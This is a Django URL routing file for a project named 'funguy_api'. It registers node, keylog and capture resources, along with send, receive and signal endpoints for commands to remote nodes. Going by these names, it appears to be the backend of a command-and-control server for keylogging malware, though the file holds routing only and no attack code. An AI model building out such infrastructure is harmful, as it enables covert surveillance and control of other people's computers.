from django.urls import path, include

from rest_framework.routers import DefaultRouter

from funguy_api.views.views import *
from funguy_api.views.brew import brew
from funguy_api.views.command import (
    send,
    receive,
    signal,
)


# standard routing
router = DefaultRouter()

router.register(r'node', NodeViewSet, basename='node')
router.register(r'keylog', KeylogViewSet, basename='keylog')
router.register(r'capture', CaptureViewSet, basename='capture')

urlpatterns = [
    path(r'', include(router.urls)),
    path(r'brew/', brew, name='brew'),  # test endpoint

    path(r'send/', send, name='send'),  # send command to node(s)
    path(r'receive/', receive, name='receive'),  # receive command
    path(r'signal/', signal, name='signal'),  # command completion signal
]
